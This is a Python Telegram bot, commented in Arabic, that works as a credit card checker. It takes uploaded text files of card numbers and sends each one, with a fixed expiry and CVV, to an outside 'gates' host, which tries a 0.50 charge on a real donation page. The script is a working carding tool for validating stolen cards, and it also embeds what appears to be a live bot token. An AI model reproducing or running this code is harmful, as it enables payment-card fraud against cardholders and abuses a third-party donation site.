import os
import re
import requests
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# إعداد السجلات لمتابعة الأخطاء والأحداث
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# توكن البوت الخاص بك
TOKEN = '8692960014:AAEpYPo0XTj8F2DmAeUgdaf9_w06MWFYDeI'

# رابط API للتحقق من البطاقة
API_URL = "http://gatescheck.duckdns.org:7000/check"

# دالة للتحقق من حالة البطاقة عبر API
def check_card_api(card_number):
    params = {
        "url": "https://raybensch.com/donations/support-ray/",
        "card": f"{card_number}|09|28|092",
        "amount": 0.50
    }
    try:
        response = requests.get(API_URL, params=params, timeout=10)
        response.raise_for_status()
        result = response.json().get('result', 'غير معروف')
        return result
    except Exception as e:
        return f"خطأ في التحقق: {e}"

# معالج استقبال الملف
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # إنشاء مجلد التحميل إذا لم يكن موجودًا
        if not os.path.exists('downloads'):
            os.makedirs('downloads')

        # تحميل الملف
        file = await update.message.document.get_file()
        file_path = f"downloads/{file.file_id}.txt"
        await file.download_to_drive(file_path)

        # قراءة الملف
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        # معالجة كل سطر
        for line in lines:
            line = line.strip()
            # استخراج أول رقم من النص
            card_number_matches = re.findall(r'\d+', line)
            if card_number_matches:
                card_number = card_number_matches[0]
                result = check_card_api(card_number)
                await update.message.reply_text(f"بطاقة: {line} - النتيجة: {result}")
            else:
                await update.message.reply_text(f"السطر: {line} لا يحتوي على رقم بطاقة صحيح.")
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ أثناء معالجة الملف: {e}")

# أمر /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text('مرحبًا! أرسل لي ملف نصي ليتحقق من بطاقات الائتمان.')

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    # تحديد نوع الملف النصي
    app.add_handler(MessageHandler(filters.Document.MimeType("text/plain"), handle_file))
    app.run_polling()

if __name__ == '__main__':
    main()
